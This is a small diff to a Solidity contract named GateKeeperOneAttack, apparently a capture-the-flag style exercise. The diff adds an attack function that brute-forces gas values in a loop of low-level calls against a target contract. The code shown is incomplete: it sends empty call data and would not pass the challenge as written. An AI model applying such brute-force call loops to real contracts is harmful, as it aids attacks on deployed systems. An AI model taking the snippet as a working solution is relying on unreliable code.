@@ -13,7 +13,13 @@ contract GateKeeperOneAttack {
         victimContract = GatekeeperOne(_victimContractAddr);
     }
 
-    function attack () public {   
+    function attack () public {  
+        for (uint i = 0; i < 8191; i++) {
+            (bool result, ) = address(victimContract).call{gas: i}("");
+            if(result) {
+                break;
+            }
+        } 
   
     }
 
